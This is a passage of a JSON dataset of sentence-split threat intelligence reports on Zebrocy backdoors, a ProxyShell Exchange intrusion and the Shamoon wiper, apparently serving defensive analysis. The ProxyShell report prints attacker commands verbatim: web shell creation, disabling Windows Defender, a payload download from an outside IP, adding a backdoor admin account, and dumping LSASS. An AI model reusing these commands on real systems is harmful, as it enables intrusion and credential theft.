    },
    {
        "id": "cti_reports_filtered/r-916.md:::S20",
        "text": "These blobs contain the different parts of the configuration.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S21",
        "text": "Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S22",
        "text": "Hence, the time between the victim running the downloader and the operators\u2019 first commands",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S23",
        "text": "is only a few minutes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S24",
        "text": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S25",
        "text": "The commands available are located in one of the configuration blobs mentioned earlier (the \u201ccommands\u201d blob in Figure 3).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S26",
        "text": "The number of supported commands has increased over time, with the latest version of the backdoor having more than thirty.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S27",
        "text": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S28",
        "text": "The first set of commands gathers information about the victim\u2019s computer and environment:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S29",
        "text": "The commands above are commonly executed when the operators first connect to a newly activated backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S30",
        "text": "They don\u2019t have any arguments, and they are quite self-explanatory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S31",
        "text": "Other commands commonly seen executed shortly after these backdoors are activated, listed below:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S32",
        "text": "Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S33",
        "text": "This information is requested within a few minutes of initial compromise and the amount of data the operator will have to deal with is quite considerable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S34",
        "text": "In order to collect even more information, from time to time the Zebrocy operators upload and use dumpers on victims\u2019 machines.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S35",
        "text": "The current dumpers have some similarities with those previously used by the group.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S36",
        "text": "In this case, Yandex Browser, Chromium, 7Star Browser (a Chromium-based browser), and CentBrowser are targeted, as well as versions of Microsoft Outlook from 1997 through 2016:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S37",
        "text": "These dumpers create log files indicating the presence or absence of potential databases to dump:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S38",
        "text": "The current dumper contains the following output when there are no databases to dump:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S39",
        "text": "- %LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data not found\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S40",
        "text": "- %LOCALAPPDATA%\\Chromium\\User Data\\Default\\Login Data not found\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S41",
        "text": "- %LOCALAPPDATA%\\7Star\\7Star\\User Data\\Default\\Login Data not found\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S42",
        "text": "- %LOCALAPPDATA%\\CentBrowser\\User Data\\Default\\Login Data not found\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S43",
        "text": "These dumpers are quickly removed once they have done their job.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S44",
        "text": "Moreover, the backdoor contains a list of filenames related to credentials from software listed below (database names):\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S45",
        "text": "The operators take care of retrieving these databases if they are present on the victim\u2019s computer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S46",
        "text": "The operators retrieve these files on the machine using the DOWNLOAD_LIST command.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S47",
        "text": "This command can be used when the operators are aware of the presence of interesting files on the computer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S48",
        "text": "Finally, depending on how interesting the victim is, they malware operators may deploy another custom backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S49",
        "text": "This backdoor is executed using the CMD_EXECUTE command:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S50",
        "text": "There are some interesting facts here.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S51",
        "text": "First, they use COM object hijacking to make the malware persistent on the system even though the custom backdoor is installed only for a few hours.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S52",
        "text": "Second, the hex-encoded string is the C&C used by the custom backdoor while in the Delphi backdoor the C&C is embedded in the configuration.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S53",
        "text": "The two Delphi backdoors, the common one and the one above, are quite similar but contain these interesting tweaks:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S54",
        "text": "Once again, it\u2019s not very clear what the purpose of this custom backdoor is.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S55",
        "text": "The detection ratio is definitely lower in comparison to the \u201cusual\u201d backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S56",
        "text": "The very short timeframe where this backdoor is on the system and operating makes it harder to retrieve.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S57",
        "text": "Once its operators complete their evil deeds, they quickly remove it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S0",
        "text": "The threat actors activity occurred in two bursts within a 3 day time frame.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S1",
        "text": "As with our previous case, they started by uploading their web shell and disabling antivirus services.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S2",
        "text": "Soon after, they established two persistence methods.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S3",
        "text": "The first was through scheduled tasks, and the second, was via a newly created account.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S4",
        "text": "The account was then added to the \u201cremote desktop users\u201d and \u201clocal administrators users\u201d groups.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S5",
        "text": "Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S6",
        "text": "After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S7",
        "text": "At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S8",
        "text": "All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S9",
        "text": "The user agent strings of python-requests/2.26.0 and python-urllib3/1.26.7 also point to the use of scripts.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S10",
        "text": "Two days later, we saw the threat actors reappear.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S11",
        "text": "We expected them to pick up where they left off, however, they repeated all previous actions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S12",
        "text": "Due to the similarity between the commands and the sequential order they ran, this is additional evidence the threat actors employed automated scripts to execute these activities.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S13",
        "text": "No further activity was observed as the threat actors were evicted from the network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S14",
        "text": "As similarly seen in our previous report Exchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S15",
        "text": "- CVE-2021-34473",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S16",
        "text": "- CVE-2021-34523",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S17",
        "text": "- CVE-2021-31207",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S18",
        "text": "With the appropriate PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S19",
        "text": "Once the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S20",
        "text": "New-ManagementRoleAssignment -Role \"Mailbox Import Export\" -User \"administrator@<REDACTED>\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S21",
        "text": "The threat actor initiated a mailbox export that matched the search criteria of Subject -eq 'aspx_wkggiyvttmu' to a provided location with the .aspx extension.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S22",
        "text": "While the file created is a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when requested.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S23",
        "text": "New-MailboxExportRequest -Mailbox \"administrator@<REDACTED>\" -FilePath \"\\\\localhost\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\aspx_wkggiyvttmu.aspx\" -IncludeFolders (\"#Drafts#\") -ContentFilter \"Subject -eq 'aspx_wkggiyvttmu'\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S24",
        "text": "In an attempt to hide the actions taken, the actor removes the request just created:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S25",
        "text": "Remove-MailboxExportRequest -Confirm \"False\" -Force \"True\" -Identity \"77a883a7-470c-471c-a193-f4c54f263fde\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S26",
        "text": "This activity then repeated approximately 2 days after the initial exploitation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S27",
        "text": "As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S28",
        "text": "Below is the second web shell created that shares the same naming convention as the first.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S29",
        "text": "New-MailboxExportRequest -Mailbox \"administrator@<REDACTED>\" -FilePath \"\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\system_web\\aspx_dyukbdcxjfi.aspx\" -IncludeFolders (\"#Drafts#\") -ContentFilter \"Subject -eq 'aspx_dyukbdcxjfi'\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S30",
        "text": "Approximately 20 seconds after the web shell aspx_wkggiyvttmu.aspx was created, a flurry of POST requests were sent to the web shell.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S31",
        "text": "The web shell followed a similar structure seen in previous cases.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S32",
        "text": "At least two parameters are sent in the POST request to the web shell, delimiter which defines what string is used to separate the response, and exec_code which is the command to be ran.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S33",
        "text": "The web shell had predefined functions for special actions:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S34",
        "text": "- get \u2013 Get file from location on disk (additional dst POST parameter)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S35",
        "text": "- put \u2013 Upload file to location (additional dst POST parameter)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S36",
        "text": "- run \u2013 Execute a list of commands separated by \u201c;\u201d using PowerShell.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S37",
        "text": "If exec_code does not start with one of the above commands, it will simply attempt to run it with PowerShell.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S38",
        "text": "The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S39",
        "text": "Below you can see an example of commands that were sent and the outputs they returned in the response.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S40",
        "text": "The actor first uploaded a file Wininet.xml , which is later used to create a scheduled task, to C:\\windows\\temp using the put command of the web shell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S41",
        "text": "This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S42",
        "text": "Scheduled Task Commands:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S43",
        "text": "- schtasks.exe /Create /F /XML C:\\windows\\temp\\Wininet.xml /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S44",
        "text": "- schtasks.exe /Run /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S45",
        "text": "Defender Modification Command:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S46",
        "text": "- try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\\Windows' -Force -AsJob} catch {}\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S47",
        "text": "- Start-Process powershell.exe {$file='c:\\windows\\dllhost.exe'; Invoke-WebRequest -Uri 'hXXp://148.251.71[.]182/update[.]tmp' -OutFile $file}\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S48",
        "text": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S49",
        "text": "Wininet.bat simply loops through the execution of the file dllhost.exe .",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S50",
        "text": "The file dllhost.exe is a golang binary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S51",
        "text": "When executed, the binary was observed resolving the following domains:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S52",
        "text": "- api.myip[.]com (for discovery)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S53",
        "text": "- tcp443.msupdate[.]us",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S54",
        "text": "- kcp53.msupdate[.]us",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S55",
        "text": "The binary also spawns the following commands when executed:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S56",
        "text": "- cmd /c wmic computersystem get domain",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S57",
        "text": "- powershell /c Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S58",
        "text": "The binary has a low confidence reference to FRP (FastReverseProxy) as the sample matches the closed source Yara rule \u2013 HKTL_PUA_FRP_FastReverseProxy_Oct21_1 (by Florian Roth) however it does not behave in the same way as the open source tool.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S59",
        "text": "This file also matches on an additional Yara rule more recently \u2013 APT_MAL_Go_FRP_CharmingKitten_Jan22_1 pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S60",
        "text": "The threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S61",
        "text": "During the first activity, we observed the use of user.exe executable that ran the following PowerShell command:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S62",
        "text": "powershell.exe /c net user /add DefaultAccount [email protected]; net user DefaultAccount /active:yes; net user DefaultAccount [email protected]; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S63",
        "text": "The first thing they did was make a new user named DefaultAccount with the password [email protected] .",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S64",
        "text": "They then activated the account and changed the password ( [email protected] ) for the second time.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S65",
        "text": "Finally the commands added the new account to the Administrators group and Remote Desktop Users group.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S66",
        "text": "The threat actors ran the same command again two days later:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S67",
        "text": "powershell.exe /c net user /add DefaultAccount [email protected]; net user DefaultAccount /active:yes; net user DefaultAccount [email protected]; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S68",
        "text": "Due to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S69",
        "text": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S70",
        "text": "Below, we can observe the content of wininet.xml:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S71",
        "text": "The following commands where then ran to initiate the task and to achieve persistence:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S72",
        "text": "- schtasks.exe /Create /F /XML %wintmp%\\Wininet.xml /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S73",
        "text": "- schtasks.exe /Run /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S74",
        "text": "The scheduled task created by the web shell was set to use",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S75",
        "text": "the principal SID \u201cS-1-5-18\u201d, or SYSTEM.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S76",
        "text": "<UserId>S-1-5",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S77",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S78",
        "text": "18</UserId>\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S79",
        "text": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S80",
        "text": "Windows Defender Behavior Monitoring was disabled.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S81",
        "text": "The Severe Threat default action was set to \u2018Allow\u2019.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S82",
        "text": "Realtime Monitoring was disabled.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S83",
        "text": "The \u2018C:\\Windows\u2019 path was excluded from scheduled and real-time scanning.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S84",
        "text": "try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\\Windows' -Force -AsJob} catch {}\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S85",
        "text": "A rule was added to the Windows Firewall to allow remote RDP traffic.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S86",
        "text": "\"netsh\" advfirewall firewall add rule name=\"Terminal Server\" dir=in action=allow protocol=TCP localport=3389",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S87",
        "text": "Remote Desktop Services was started.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S88",
        "text": "\"net\" start TermService",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S89",
        "text": "The threat actor enabled WDigest authentication.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S90",
        "text": "This enforces the storage of credentials in plaintext on future logins.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S91",
        "text": "\"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S92",
        "text": "LSA protection was disabled.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S93",
        "text": "\"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S94",
        "text": "The threat actor created a process memory dump from LSASS.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S95",
        "text": "In this case they created a \u201cminidump\u201d using the LOLBIN comsvcs.dll.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S96",
        "text": "This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S97",
        "text": "\"powershell.exe\" /c Remove-Item -Path C:\\windows\\temp\\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\windows\\temp\\ssasl.pmd full | out-host; Compress-Archive C:\\windows\\temp\\ssasl.pmd C:\\windows\\temp\\ssasl.zip",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S98",
        "text": "The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S99",
        "text": "They executed commands such as:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S100",
        "text": "net.exe user",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S101",
        "text": "ipconfig.exe /all",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S102",
        "text": "powershell.exe (multiple commands)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S103",
        "text": "quser.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S104",
        "text": "These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S105",
        "text": "They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S106",
        "text": "Get-WMIObject Win32_NTDomain | findstr DomainController",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S107",
        "text": "Additionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S108",
        "text": "This was likely done as a test.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S109",
        "text": "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S110",
        "text": "While having access to the Exchange server, we observed no attempts to export or access user mailboxes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S111",
        "text": "As we saw from the execution section, dllhost.exe was used to access the below domains for C2, which we believe was using a variation of FRP.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S112",
        "text": "- tcp443.msupdate[.]us (107.173.231[.]114)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S113",
        "text": "- kcp53.msupdate[.]us",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S114",
        "text": "- (107.173.231[.]114)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S115",
        "text": "This C2 channel was not used very much as most activity was done through the web shell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S116",
        "text": "The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S117",
        "text": "Here you can see the threat actor using the web shell command to extract it:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S118",
        "text": "In this case, there was no further impact to the environment before the threat actors were evicted.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-932.md:::S119",
        "text": "Due to our previous report and OSINT research we believe with medium to high confidence that this intrusion would have ended in ransomware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S0",
        "text": "Shamoon is a dropper that carries three resources.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S1",
        "text": "The dropper is responsible for collecting data as well as embedding evasion techniques such as obfuscation, antidebugging, or antiforensic tricks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S2",
        "text": "The dropper requires an argument to run.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S3",
        "text": "It decrypts the three resources and installs them on the system in the %System% folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S4",
        "text": "It also creates the service MaintenaceSrv, which runs the wiper.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S5",
        "text": "The typo in the service name eases detection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S6",
        "text": "The Advanced Threat Research team has watched this service evolve over the years.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S7",
        "text": "The following tables highlight the differences:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S8",
        "text": "The wiper uses ElRawDisk.sys to access the user\u2019s raw disk and overwrites all data in all folders and disk sectors, causing a critical state of the infected machine before it finally reboots.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S9",
        "text": "The result is either a blue screen or driver error that renders the machine unusable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S10",
        "text": "The dropper contains other malicious components masked as encrypted files embedded in PE section.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S11",
        "text": "These resources are decrypted by the dropper and contain:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S12",
        "text": "- MNU: The communication module\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S13",
        "text": "- LNG: The wiper component\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S14",
        "text": "- PIC: The 64-bit version of the dropper\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S15",
        "text": "Shamoon 2018 needs an argument to run and infect machines.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S16",
        "text": "It decrypts several strings in memory that gather information on the system and determine whether to drop the 32-bit or 64-bit version.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S17",
        "text": "It also drops the file key8854321.pub (MD5: 41f8cd9ac3fb6b1771177e5770537518) in the folder c:\\Windows\\Temp\\key8854321.pub.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S18",
        "text": "The malware decrypts two files used later:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S19",
        "text": "- C:\\Windows\\inf\\mdmnis5tQ1.pnf",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S20",
        "text": "- C:\\Windows\\inf\\averbh_noav.pnf",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S21",
        "text": "Shamoon enables the service RemoteRegistry, which allows a program to remotely modify the registry.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S22",
        "text": "It also disables remote user account control by enabling the registry key LocalAccountTokenFilterPolicy.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S23",
        "text": "The malware checks whether the following shares exist to copy itself and spread:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S24",
        "text": "- ADMIN$",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S25",
